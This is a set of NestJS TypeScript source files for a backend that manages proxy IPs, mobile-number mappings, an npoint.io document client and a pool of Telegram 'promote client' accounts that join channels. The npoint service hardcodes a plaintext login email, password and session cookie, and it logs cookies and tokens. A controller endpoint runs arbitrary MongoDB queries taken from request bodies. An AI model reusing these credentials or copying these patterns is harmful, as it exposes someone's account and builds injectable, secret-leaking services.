    issues.push('High number of inactive IPs');\r\n            }\r\n\r\n            return {\r\n                status,\r\n                availableIps: stats.available,\r\n                totalActiveIps: stats.total - stats.inactive,\r\n                utilizationRate: parseFloat(utilizationRate.toFixed(1)),\r\n                issues\r\n            };\r\n        } catch (error) {\r\n            this.logger.error(`Error during health check: ${error.message}`);\r\n            return {\r\n                status: 'critical',\r\n                availableIps: 0,\r\n                totalActiveIps: 0,\r\n                utilizationRate: 0,\r\n                issues: ['Health check failed']\r\n            };\r\n        }\r\n    }\r\n}\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Document } from 'mongoose';\r\n\r\nexport type IpMobileMappingDocument = IpMobileMapping & Document;\r\n\r\n@Schema({\r\n    collection: 'ip_mobile_mappings',\r\n    versionKey: false,\r\n    autoIndex: true,\r\n    timestamps: true,\r\n    toJSON: {\r\n        virtuals: true,\r\n        transform: (doc, ret) => {\r\n            delete ret._id;\r\n        },\r\n    },\r\n})\r\nexport class IpMobileMapping {\r\n    @ApiProperty({ example: '916265240911', description: 'Mobile number' })\r\n    @Prop({ required: true, unique: true })\r\n    mobile: string;\r\n\r\n    @ApiProperty({ example: '192.168.1.100:8080', description: 'IP address and port combination' })\r\n    @Prop({ required: true })\r\n    ipAddress: string;\r\n\r\n    @ApiProperty({ example: 'client1', description: 'Client ID that owns this mobile number' })\r\n    @Prop({ required: true })\r\n    clientId: string;\r\n\r\n\r\n\r\n    @ApiProperty({ example: 'active', description: 'Status of this mapping', enum: ['active', 'inactive'] })\r\n    @Prop({ required: true, default: 'active', enum: ['active', 'inactive'] })\r\n    status: string;\r\n}\r\n\r\nexport const IpMobileMappingSchema = SchemaFactory.createForClass(IpMobileMapping);\r\n\r\n// Create indexes for better performance\r\nIpMobileMappingSchema.index({ clientId: 1 });\r\nIpMobileMappingSchema.index({ ipAddress: 1 });\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { Document } from 'mongoose';\r\n\r\nexport type ProxyIpDocument = ProxyIp & Document;\r\n\r\n@Schema({\r\n    collection: 'proxy_ips',\r\n    versionKey: false,\r\n    autoIndex: true,\r\n    timestamps: true,\r\n    toJSON: {\r\n        virtuals: true,\r\n        transform: (doc, ret) => {\r\n            delete ret._id;\r\n        },\r\n    },\r\n})\r\nexport class ProxyIp {\r\n    @ApiProperty({ example: '192.168.1.100', description: 'IP address of the proxy' })\r\n    @Prop({ required: true, unique: true })\r\n    ipAddress: string;\r\n\r\n    @ApiProperty({ example: 8080, description: 'Port number of the proxy' })\r\n    @Prop({ required: true })\r\n    port: number;\r\n\r\n    @ApiProperty({ example: 'http', description: 'Protocol type (http, https, socks5)', enum: ['http', 'https', 'socks5'] })\r\n    @Prop({ required: true, enum: ['http', 'https', 'socks5'] })\r\n    protocol: string;\r\n\r\n    @ApiProperty({ example: 'username', description: 'Username for proxy authentication' })\r\n    @Prop({ required: false })\r\n    username?: string;\r\n\r\n    @ApiProperty({ example: 'password', description: 'Password for proxy authentication' })\r\n    @Prop({ required: false })\r\n    password?: string;\r\n\r\n    @ApiProperty({ example: 'active', description: 'Status of the proxy IP', enum: ['active', 'inactive'] })\r\n    @Prop({ required: true, default: 'active', enum: ['active', 'inactive'] })\r\n    status: string;\r\n\r\n    @ApiProperty({ example: false, description: 'Whether this IP is currently assigned to a mobile number' })\r\n    @Prop({ required: true, default: false })\r\n    isAssigned: boolean;\r\n\r\n    @ApiProperty({ example: 'client1', description: 'Client ID that owns this IP' })\r\n    @Prop({ required: false })\r\n    assignedToClient?: string;\r\n}\r\n\r\nexport const ProxyIpSchema = SchemaFactory.createForClass(ProxyIp);\r\n\r\n// Create indexes for better performance\r\nProxyIpSchema.index({ ipAddress: 1, port: 1 }, { unique: true });\r\nProxyIpSchema.index({ status: 1, isAssigned: 1 });\r\nProxyIpSchema.index({ assignedToClient: 1 });\r\n","export * from './npoint.controller';\nexport * from './npoint.module';\nexport * from './npoint.service';\n","import {\n    Controller,\n    Get,\n    Post,\n    Put,\n    Param,\n    Body,\n    HttpException,\n    HttpStatus,\n  } from '@nestjs/common';\n  import { NpointService } from './npoint.service';\n  import {\n    ApiTags,\n    ApiOperation,\n    ApiParam,\n    ApiBody,\n    ApiResponse,\n  } from '@nestjs/swagger';\n  \n  @ApiTags('NPoint API') // Group endpoints under \"NPoint API\" in Swagger UI\n  @Controller('npoint')\n  export class NpointController {\n    constructor(private readonly npointService: NpointService) {}\n  \n    @Get('documents/:id')\n    @ApiOperation({ summary: 'Fetch a document by ID' }) // Description of the endpoint\n    @ApiParam({ name: 'id', description: 'The ID of the document to fetch' }) // Document the parameter\n    @ApiResponse({\n      status: 200,\n      description: 'Document fetched successfully',\n    })\n    @ApiResponse({ status: 404, description: 'Document not found' })\n    async fetchDocument(@Param('id') id: string) {\n      try {\n        return await this.npointService.fetchDocument(id);\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.NOT_FOUND);\n      }\n    }\n  \n    @Post('documents')\n    @ApiOperation({ summary: 'Post a new document' })\n    @ApiBody({\n      description: 'The document to post',\n      schema: {\n        example: {\n          title: 'My Document',\n          content: 'This is the content of the document.',\n        },\n      },\n    })\n    @ApiResponse({\n      status: 201,\n      description: 'Document posted successfully',\n    })\n    @ApiResponse({ status: 400, description: 'Invalid input' })\n    async postDocument(@Body() document: any) {\n      try {\n        return await this.npointService.postDocument(document);\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\n      }\n    }\n\n    @Get('documents')\n    @ApiOperation({ summary: 'Fetch all documents' })\n    @ApiResponse({\n      status: 200,\n      description: 'List of all documents fetched successfully',\n    })\n    @ApiResponse({ status: 500, description: 'Internal server error' })\n    async fetchAllDocuments() {\n      try {\n        return await this.npointService.fetchAllDocuments();\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\n      }\n    }  \n  \n    @Put('documents/:id')\n    @ApiOperation({ summary: 'Update a document by ID' })\n    @ApiParam({ name: 'id', description: 'The ID of the document to update' })\n    @ApiBody({\n      description: 'The updated document',\n      schema: {\n        example: {\n          title: 'Updated Document',\n          content: 'This is the updated content of the document.',\n        },\n      },\n    })\n    @ApiResponse({\n      status: 200,\n      description: 'Document updated successfully',\n    })\n    @ApiResponse({ status: 404, description: 'Document not found' })\n    async updateDocument(@Param('id') id: string, @Body() updatedDocument: any) {\n      try {\n        return await this.npointService.updateDocument(id, updatedDocument);\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.NOT_FOUND);\n      }\n    }\n  }","import { Module } from '@nestjs/common';\nimport { NpointService } from './npoint.service';\nimport { NpointController } from './npoint.controller';\nimport { InitModule } from '../ConfigurationInit';\n\n@Module({\n  imports: [\n    InitModule,\n  ],\n  controllers: [NpointController],\n  providers: [NpointService],\n  exports: [NpointService]\n})\nexport class NpointModule {}","import { Injectable, Logger } from '@nestjs/common';\nimport axios from 'axios';\n\n@Injectable()\nexport class NpointService {\n    private readonly logger = new Logger(NpointService.name);\n    private csrfToken: string | null = null;\n    private cookie: string | null = '_npoint_session=MTBOeElFZ0pXV0oxTm9xd1dQQ0tNYnhVYWg1blFCMUVtUUJVWFQ1cGZwdlNwSTdacjBVTStJbDlHaGlWd0pGUDRzUmRaYnZNQVNTMTVmY1R6dEVUd0RPMXVFcmE1cnFYY09qd1A5TFpNVnZOUnVJRnlWV3ZtODk0ajlQVXQ0QzQ0MUtGeU5mTTB5dGFPNCtLUW9tVy9yTmFRZzlRQUdRK0NkQVVtZGxtMVEySzN0TC9sUjdMR2RjVW5xTmtleWw4TWdPOVNMa2JaZEs1c1o3eGE3UHdsQ2JiTEdQbHhUaysraCsrcG9LM25YREdyTDdpYWlHQ0wraEhNV3NXbzJtK1YvVzEvVTh2Z0N5bnpzU1hqcndiM041L2I3R29UMDY3RitBYkxvTktWaUVmdTg4SGJORjRTS25uZ2JDSWhmNWFoem0vNGNvUnAzMDBsQ0FJcUZTMjdnPT0tLWs2a2x2SUZqcHhDN1A0eFdUaWhBeVE9PQ%3D%3D--4d0883b9956c6d2744389228dab7321ff2eb88e5';\n    private readonly baseUrl = 'https://www.npoint.io'; // Replace with your API base URL\n    private readonly signInUrl = 'https://www.npoint.io/users/sign_in'; // Replace with your sign-in API URL\n\n    // Method to fetch CSRF token from the sign-in API\n    private async fetchCsrfToken(): Promise<string> {\n        this.logger.debug('Fetching CSRF token...');\n        try {\n            const data = JSON.stringify({\n                \"user\": {\n                    \"email\": \"dodieajt@gmail.com\",\n                    \"password\": \"Ajtdmwajt1@\"\n                }\n            });\n\n            const config = {\n                method: 'post',\n                maxBodyLength: Infinity,\n                url: this.signInUrl,\n                headers: {\n                    'Content-Type': 'application/json',\n                    'Cookie': this.cookie\n                },\n                data: data\n            };\n\n            const response = await axios.request(config)\n            console.log(\"Cookie:\", response.headers['set-cookie'][0]);\n            this.cookie = response.headers['set-cookie'][0];\n            // Extract CSRF token from the response (adjust based on your API response structure)\n            this.csrfToken = await this.fetchCsrfTokenFromHtml(response.data);\n\n            if (!this.csrfToken) {\n                throw new Error('CSRF token not found in the sign-in response.');\n            }\n\n            this.logger.debug('CSRF token fetched successfully.');\n            return this.csrfToken;\n        } catch (error) {\n            this.logger.error(`Failed to fetch CSRF token: ${error.message}`);\n            throw new Error(`Failed to fetch CSRF token: ${error.message}`);\n        }\n    }\n\n    // Method to ensure CSRF token is available\n    private async ensureCsrfToken(): Promise<void> {\n        if (!this.csrfToken) {\n            await this.fetchCsrfToken();\n        }\n    }\n\n    // Method to fetch a document\n    async fetchDocument(documentId: string): Promise<any> {\n        this.logger.debug(`Fetching document with ID: ${documentId}`);\n        await this.ensureCsrfToken();\n\n        try {\n            const response = await axios.get(`${this.baseUrl}/documents/${documentId}`, {\n                headers: {\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                    'Cookie': this.cookie\n                },\n            });\n\n            this.logger.debug(`Document with ID: ${documentId} fetched successfully.`);\n            return response.data;\n        } catch (error) {\n            this.logger.error(`Failed to fetch document with ID: ${documentId}: ${error.message}`);\n            throw new Error(`Failed to fetch document: ${error.message}`);\n        }\n    }\n\n    // Method to post a document\n    async postDocument(document: any): Promise<any> {\n        this.logger.debug('Posting a new document...');\n        await this.ensureCsrfToken();\n\n        try {\n            const response = await axios.post(`${this.baseUrl}/documents`, { \"generate_contents\": true }, {\n                headers: {\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                    'Cookie': this.cookie\n                },\n            });\n\n            this.logger.debug(`Document posted successfully. Updating document with token: ${response.data.token}`);\n            await this.updateDocument(response.data.token, document);\n            return response.data;\n        } catch (error) {\n            this.logger.error(`Failed to post document: ${error.message}`);\n            throw new Error(`Failed to post document: ${error.message}`);\n        }\n    }\n\n    // Method to update a document\n    async updateDocument(documentId: string, updatedDocument: any): Promise<any> {\n        this.logger.debug(`Updating document with ID: ${documentId}`);\n        await this.ensureCsrfToken();\n\n        // const oldDocument = (await axios.get(`https://api.npoint.io/${documentId}`)).data;\n        const body =\n        {\n            \"contents\": JSON.stringify(updatedDocument),\n            \"original_contents\": JSON.stringify(updatedDocument),\n            \"schema\": null,\n            \"original_schema\": \"\"\n        }\n\n        try {\n            const response = await axios.put(\n                `${this.baseUrl}/documents/${documentId}`,\n                body,\n                {\n                    headers: {\n                        'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                        'Cookie': this.cookie\n                    },\n                },\n            );\n            this.logger.debug(`Document with ID: ${documentId} updated successfully.`);\n            console.log(response.data.contents);\n            return response.data;\n        } catch (error) {\n            this.logger.error(`Failed to update document with ID: ${documentId}: ${error.message}`);\n            throw new Error(`Failed to update document: ${error.message}`);\n        }\n    }\n\n    async fetchAllDocuments(): Promise<any[]> {\n        await this.ensureCsrfToken();\n\n        try {\n            const response = await axios.get(`${this.baseUrl}/documents`, {\n                headers: {\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                    'Cookie': this.cookie\n                },\n            });\n\n            return response.data;\n        } catch (error) {\n            throw new Error(`Failed to fetch all documents: ${error.message}`);\n        }\n    }\n\n    async fetchCsrfTokenFromHtml(data) {\n        try {\n            // Step 1: Use a regular expression to match the CSRF token in the <meta> tag\n            const csrfTokenMatch = data.match(/<meta name=\"csrf-token\" content=\"([^\"]+)\"/);\n\n            // Step 2: Check if the CSRF token was found\n            if (!csrfTokenMatch || !csrfTokenMatch[1]) {\n                throw new Error('CSRF token not found in the HTML response.');\n            }\n\n            // Step 3: Extract the CSRF token\n            const csrfToken = csrfTokenMatch[1];\n\n            // Log the CSRF token (optional)\n            console.log('CSRF Token:', csrfToken);\n\n            return csrfToken;\n        } catch (error) {\n            console.error('Error fetching CSRF token:', error);\n        }\n    }\n}","import { ApiProperty } from '@nestjs/swagger';\nimport {  IsNumber, IsString, IsOptional, IsDateString } from 'class-validator';\n\nexport class CreatePromoteClientDto {\n  @ApiProperty({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsString()\n  readonly tgId: string;\n\n  @ApiProperty({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsString()\n  readonly mobile: string;\n\n  @ApiProperty({\n    description: 'Date of the session',\n    example: '2023-06-22',\n  })\n  @IsString()\n  readonly availableDate: string;\n\n  @ApiProperty({\n    description: 'lastActive identifier',\n    example: '2023-06-22',\n  })\n  @IsString()\n  readonly lastActive: string;\n\n  @ApiProperty({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsNumber()\n  readonly channels: number;\n\n  @ApiProperty({\n    description: 'Client ID this promote mobile belongs to',\n    example: 'client123',\n    required: false\n  })\n  @IsOptional()\n  @IsString()\n  readonly clientId?: string;\n\n  @ApiProperty({\n    description: 'Status of the promote client',\n    example: 'active',\n    default: 'active',\n    required: false\n  })\n  @IsOptional()\n  @IsString()\n  readonly status?: string;\n\n  @ApiProperty({\n    description: 'Status message for the promote client',\n    example: 'Account is functioning properly',\n    default: 'Account is functioning properly',\n    required: false\n  })\n  @IsOptional()\n  @IsString()\n  readonly message?: string;\n\n  @ApiProperty({\n    description: 'Last used timestamp for the promote client',\n    example: '2023-06-22T10:30:00.000Z',\n    required: false\n  })\n  @IsOptional()\n  @IsDateString()\n  readonly lastUsed?: Date;\n}\n","// Export all DTOs\nexport * from './create-promote-client.dto';\nexport * from './search-promote-client.dto';\nexport * from './update-promote-client.dto';\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { IsString, IsBoolean, IsOptional, IsNumber } from 'class-validator';\n\nexport class SearchPromoteClientDto {\n  @ApiPropertyOptional({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsOptional()\n  @IsString()\n  readonly tgId?: string;\n\n  @ApiPropertyOptional({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsOptional()\n  @IsString()\n  readonly mobile?: string;\n\n  @ApiPropertyOptional({\n    description: 'availableDate of the promoteClient',\n    example: '2023-06-22',\n  })\n  @IsOptional()\n  @IsString()\n  readonly availableDate?: string;\n\n  @ApiPropertyOptional({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsOptional()\n  @IsNumber()\n  readonly channels?: number;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreatePromoteClientDto } from './create-promote-client.dto';\n\nexport class UpdatePromoteClientDto extends PartialType(CreatePromoteClientDto) {}\n","export * from './promote-client.controller';\nexport * from './promote-client.module';\nexport * from './promote-client.service';\nexport * from './dto';\nexport * from './schemas';\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, Put, BadRequestException } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody, ApiParam, ApiQuery } from '@nestjs/swagger';\nimport { PromoteClientService } from './promote-client.service';\nimport { CreatePromoteClientDto } from './dto/create-promote-client.dto';\nimport { SearchPromoteClientDto } from './dto/search-promote-client.dto';\nimport { PromoteClient } from './schemas/promote-client.schema';\nimport { UpdatePromoteClientDto } from './dto/update-promote-client.dto';\n\n@ApiTags('Promote Clients')\n@Controller('promoteclients')\nexport class PromoteClientController {\n  constructor(\n    private readonly clientService: PromoteClientService,\n  ) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create user data' })\n  async create(@Body() createClientDto: CreatePromoteClientDto): Promise<PromoteClient> {\n    return this.clientService.create(createClientDto);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search user data' })\n  @ApiQuery({ name: 'mobile', required: false, description: 'Mobile number' })\n  @ApiQuery({ name: 'firstName', required: false, description: 'First name' })\n  @ApiQuery({ name: 'lastName', required: false, description: 'Last name' })\n  @ApiQuery({ name: 'username', required: false, description: 'Username' })\n  async search(@Query() query: SearchPromoteClientDto): Promise<PromoteClient[]> {\n    return this.clientService.search(query);\n  }\n\n  @Get('joinChannelsForPromoteClients')\n  @ApiOperation({ summary: 'Join Channels for PromoteClients' })\n  async joinChannelsforPromoteClients(): Promise<string> {\n    return this.clientService.joinchannelForPromoteClients();\n  }\n\n  @Get('updateInfo')\n  @ApiOperation({ summary: 'Update promote Clients Info' })\n  async updateInfo(): Promise<string> {\n    // Fire-and-forget pattern for long-running operations\n    this.clientService.updateInfo().catch(error => {\n      console.error('Error in checkPromoteClients:', error);\n    });\n    return \"initiated Checking\"\n  }\n\n  @Get('checkPromoteClients')\n  @ApiOperation({ summary: 'Check Promote Clients' })\n  async checkpromoteClients(): Promise<string> {\n    // Fire-and-forget pattern for long-running operations\n    this.clientService.checkPromoteClients().catch(error => {\n      console.error('Error in checkPromoteClients:', error);\n    });\n    return \"initiated Checking\"\n  }\n\n  @Post('addNewUserstoPromoteClients')\n  @ApiOperation({ summary: 'Add New Users to Promote Clients' })\n  @ApiBody({\n    schema: {\n      type: 'object',\n      properties: {\n        goodIds: { type: 'array', items: { type: 'string' } },\n        badIds: { type: 'array', items: { type: 'string' } },\n        clientsNeedingPromoteClients: { type: 'array', items: { type: 'string' } }\n      }\n    }\n  })\n  async addNewUserstoPromoteClients(@Body() body: {\n    goodIds: string[],\n    badIds: string[],\n    clientsNeedingPromoteClients?: string[]\n  }): Promise<string> {\n    // Validate input parameters\n    if (!body || !Array.isArray(body.goodIds) || !Array.isArray(body.badIds)) {\n      throw new BadRequestException('goodIds and badIds must be arrays');\n    }\n\n    if (body.clientsNeedingPromoteClients && !Array.isArray(body.clientsNeedingPromoteClients)) {\n      throw new BadRequestException('clientsNeedingPromoteClients must be an array');\n    }\n\n    // Fire-and-forget pattern for long-running operations\n    this.clientService.addNewUserstoPromoteClients(\n      body.badIds,\n      body.goodIds,\n      body.clientsNeedingPromoteClients || [],\n      undefined // No promoteClientsPerClient map available in controller\n    ).catch(error => {\n      console.error('Error in addNewUserstoPromoteClients:', error);\n    });\n    return \"initiated Checking\"\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all user data' })\n  @ApiQuery({ name: 'status', required: false, description: 'Filter by status (active/inactive)' })\n  async findAll(@Query('status') status?: string): Promise<PromoteClient[]> {\n    return this.clientService.findAll(status);\n  }\n\n  @Get('SetAsPromoteClient/:mobile')\n  @ApiOperation({ summary: 'Set as Promote Client' })\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n  async setAsPromoteClient(\n    @Param('mobile') mobile: string,\n  ) {\n    return await this.clientService.setAsPromoteClient(mobile);\n  }\n\n  @Get('mobile/:mobile')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  async findOne(@Param('mobile') mobile: string): Promise<PromoteClient> {\n    return this.clientService.findOne(mobile);\n  }\n\n  @Patch('mobile/:mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\n    return this.clientService.update(mobile, updateClientDto);\n  }\n\n  @Put('mobile/:mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async createdOrupdate(@Param('mobile') mobile: string, @Body() updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\n    return this.clientService.createOrUpdate(mobile, updateClientDto);\n  }\n\n  @Delete('mobile/:mobile')\n  @ApiOperation({ summary: 'Delete user data by ID' })\n  async remove(@Param('mobile') mobile: string): Promise<void> {\n    return this.clientService.remove(mobile);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  @ApiBody({ type: Object })\n  async executeQuery(@Body() query: object): Promise<any> {\n    try {\n      return await this.clientService.executeQuery(query);\n    } catch (error) {\n      throw error;  // You might want to handle errors more gracefully\n    }\n  }\n\n  @Get('distribution')\n  @ApiOperation({ summary: 'Get promote client distribution per client' })\n  async getPromoteClientDistribution(): Promise<any> {\n    return this.clientService.getPromoteClientDistribution();\n  }\n\n  @Get('status/:status')\n  @ApiOperation({ summary: 'Get promote clients by status' })\n  @ApiParam({ name: 'status', description: 'Status to filter by (active/inactive)', type: String })\n  async getPromoteClientsByStatus(@Param('status') status: string): Promise<PromoteClient[]> {\n    return this.clientService.getPromoteClientsByStatus(status);\n  }\n\n  @Get('messages/all')\n  @ApiOperation({ summary: 'Get all promote clients with their status messages' })\n  async getPromoteClientsWithMessages(): Promise<Array<{ mobile: string, status: string, message: string, clientId?: string }>> {\n    return this.clientService.getPromoteClientsWithMessages();\n  }\n\n  @Patch('status/:mobile')\n  @ApiOperation({ summary: 'Update status of a promote client' })\n  @ApiParam({ name: 'mobile', description: 'Mobile number of the promote client', type: String })\n  @ApiBody({\n    schema: {\n      type: 'object',\n      properties: {\n        status: { type: 'string', description: 'New status (active/inactive)' },\n        message: { type: 'string', description: 'Status message (optional)' }\n      },\n      required: ['status']\n    }\n  })\n  async updateStatus(\n    @Param('mobile') mobile: string,\n    @Body() body: { status: string, message?: string }\n  ): Promise<PromoteClient> {\n    return this.clientService.updateStatus(mobile, body.status, body.message);\n  }\n\n  @Patch('activate/:mobile')\n  @ApiOperation({ summary: 'Mark a promote client as active' })\n  @ApiParam({ name: 'mobile', description: 'Mobile number of the promote client', type: String })\n  @ApiBody({\n    schema: {\n      type: 'object',\n      properties: {\n        message: { type: 'string', description: 'Activation message (optional)' }\n      }\n    }\n  })\n  async markAsActive(\n    @Param('mobile') mobile: string,\n    @Body() body: { message?: string } = {}\n  ): Promise<PromoteClient> {\n    return this.clientService.markAsActive(mobile, body.message);\n  }\n\n  @Patch('deactivate/:mobile')\n  @ApiOperation({ summary: 'Mark a promote client as inactive' })\n  @ApiParam({ name: 'mobile', description: 'Mobile number of the promote client', type: String })\n  @ApiBody({\n    schema: {\n      type: 'object',\n      properties: {\n        reason: { type: 'string', description: 'Reason for deactivation' }\n      },\n      required: ['reason']\n    }\n  })\n  async markAsInactive(\n    @Param('mobile') mobile: string,\n    @Body() body: { reason: string }\n  ): Promise<PromoteClient> {\n    return this.clientService.markAsInactive(mobile, body.reason);\n  }\n\n  @Patch('mark-used/:mobile')\n  @ApiOperation({ summary: 'Mark a promote client as used (update lastUsed timestamp)' })\n  @ApiParam({ name: 'mobile', description: 'Mobile number of the promote client', type: String })\n  @ApiBody({\n    schema: {\n      type: 'object',\n      properties: {\n        message: { type: 'string', description: 'Usage message (optional)' }\n      }\n    }\n  })\n  async markAsUsed(\n    @Param('mobile') mobile: string,\n    @Body() body: { message?: string } = {}\n  ): Promise<PromoteClient> {\n    return this.clientService.markAsUsed(mobile, body.message);\n  }\n\n  @Patch('update-last-used/:mobile')\n  @ApiOperation({ summary: 'Update last used timestamp for a promote client' })\n  @ApiParam({ name: 'mobile', description: 'Mobile number of the promote client', type: String })\n  async updateLastUsed(@Param('mobile') mobile: string): Promise<PromoteClient> {\n    return this.clientService.updateLastUsed(mobile);\n  }\n\n  @Get('least-recently-used/:clientId')\n  @ApiOperation({ summary: 'Get least recently used promote clients for a specific client' })\n  @ApiParam({ name: 'clientId', description: 'Client ID to get promote clients for', type: String })\n  @ApiQuery({ name: 'limit', required: false, description: 'Number of promote clients to return', type: Number })\n  async getLeastRecentlyUsed(\n    @Param('clientId') clientId: string,\n    @Query('limit') limit?: number\n  ): Promise<PromoteClient[]> {\n    return this.clientService.getLeastRecentlyUsedPromoteClients(clientId, limit || 1);\n  }\n\n  @Get('next-available/:clientId')\n  @ApiOperation({ summary: 'Get next available promote client for a specific client' })\n  @ApiParam({ name: 'clientId', description: 'Client ID to get next available promote client for', type: String })\n  async getNextAvailable(@Param('clientId') clientId: string): Promise<PromoteClient | null> {\n    return this.clientService.getNextAvailablePromoteClient(clientId);\n  }\n\n  @Get('unused')\n  @ApiOperation({ summary: 'Get promote clients that haven\\'t been used for a specified time period' })\n  @ApiQuery({ name: 'hoursAgo', required: false, description: 'Hours ago cutoff (default: 24)', type: Number })\n  @ApiQuery({ name: 'clientId', required: false, description: 'Filter by specific client ID', type: String })\n  async getUnusedPromoteClients(\n    @Query('hoursAgo') hoursAgo?: number,\n    @Query('clientId') clientId?: string\n  ): Promise<PromoteClient[]> {\n    return this.clientService.getUnusedPromoteClients(hoursAgo || 24, clientId);\n  }\n\n  @Get('usage-stats')\n  @ApiOperation({ summary: 'Get usage statistics for promote clients' })\n  @ApiQuery({ name: 'clientId', required: false, description: 'Filter by specific client ID', type: String })\n  async getUsageStatistics(@Query('clientId') clientId?: string): Promise<{\n    totalClients: number;\n    neverUsed: number;\n    usedInLast24Hours: number;\n    usedInLastWeek: number;\n    averageUsageGap: number;\n  }> {\n    return this.clientService.getUsageStatistics(clientId);\n  }\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { PromoteClientService } from './promote-client.service';\nimport { PromoteClientController } from './promote-client.controller';\nimport { PromoteClient, PromoteClientSchema } from './schemas/promote-client.schema';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\nimport { UsersModule } from '../users/users.module';\nimport { ClientModule } from '../clients/client.module';\nimport { InitModule } from '../ConfigurationInit/init.module';\nimport { ChannelsModule } from '../channels/channels.module';\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\nimport { SessionModule } from '../session-manager';\n\n@Module({\n  imports: [\n    InitModule,\n    MongooseModule.forFeature([{ name: PromoteClient.name, schema: PromoteClientSchema, collection: 'promoteClients' }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => UsersModule),\n    forwardRef(() => ActiveChannelsModule),\n    forwardRef(() => ClientModule),\n    forwardRef(() => ChannelsModule),\n    forwardRef(() => BufferClientModule),\n    forwardRef(() => SessionModule)\n ],\n  controllers: [PromoteClientController],\n  providers: [PromoteClientService],\n  exports: [PromoteClientService]\n})\nexport class PromoteClientModule { }\n","import { ChannelsService } from '../channels/channels.service';\nimport { Channel } from '../channels/schemas/channel.schema';\nimport { BadRequestException, ConflictException, HttpException, Inject, Injectable, InternalServerErrorException, Logger, NotFoundException, OnModuleDestroy, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreatePromoteClientDto } from './dto/create-promote-client.dto';\nimport { PromoteClient, PromoteClientDocument } from './schemas/promote-client.schema';\nimport { TelegramService } from '../Telegram/Telegram.service';\nimport { sleep } from 'telegram/Helpers';\nimport { UsersService } from '../users/users.service';\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\nimport { ClientService } from '../clients/client.service';\nimport { UpdatePromoteClientDto } from './dto/update-promote-client.dto';\nimport { BufferClientService } from '../buffer-clients/buffer-client.service';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport { connectionManager } from '../Telegram/utils/connection-manager'\nimport { SessionService } from '../session-manager';\nimport TelegramManager from '../Telegram/TelegramManager';\n@Injectable()\nexport class PromoteClientService implements OnModuleDestroy {\n    private readonly logger = new Logger(PromoteClientService.name);\n    private joinChannelMap: Map<string, Channel[]> = new Map();\n    private joinChannelIntervalId: NodeJS.Timeout;\n    private leaveChannelMap: Map<string, string[]> = new Map();\n    private leaveChannelIntervalId: NodeJS.Timeout;\n    private isLeaveChannelProcessing: boolean = false;\n    private isJoinChannelProcessing: boolean = false;\n    private readonly JOIN_CHANNEL_INTERVAL = 4 * 60 * 1000; // 4 minutes\n    private readonly LEAVE_CHANNEL_INTERVAL = 60 * 1000; // 60 seconds\n    private readonly LEAVE_CHANNEL_BATCH_SIZE = 10;\n    private readonly MAX_NEW_PROMOTE_CLIENTS_PER_TRIGGER = 10; // Rate limiting constant\n    private readonly MAX_NEEDED_PROMOTE_CLIENTS_PER_CLIENT = 16; // Max promote clients per client\n    constructor(@InjectModel(PromoteClient.name) private promoteClientModel: Model<PromoteClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private activeChannelsService: ActiveChannelsService,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n        @Inject(forwardRef(() => ChannelsService))\n        private channelsService: ChannelsService,\n        @Inject(forwardRef(() => BufferClientService))\n        private bufferClientService: BufferClientService,\n        @Inject(forwardRef(() => SessionService))\n        private sessionService: SessionService,\n    ) { }\n\n    async create(promoteClient: CreatePromoteClientDto): Promise<PromoteClient> {\n        // Set default values if not provided\n        const promoteClientData = {\n            ...promoteClient,\n            status: promoteClient.status || 'active',\n            message: promoteClient.message || 'Account is functioning properly'\n        };\n        const newUser = new this.promoteClientModel(promoteClientData);\n        return newUser.save();\n    }\n\n    async findAll(statusFilter?: string): Promise<PromoteClient[]> {\n        const 